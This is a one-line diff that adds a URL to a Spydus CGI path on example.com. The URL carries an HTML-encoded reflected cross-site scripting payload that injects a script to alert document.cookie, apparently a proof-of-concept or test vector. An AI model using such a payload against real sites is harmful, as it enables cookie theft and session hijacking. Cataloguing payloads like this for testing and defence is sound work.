@@ -1,0 +1,1 @@
+http://www.example.com/cgi-bin/spydus.exe/&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
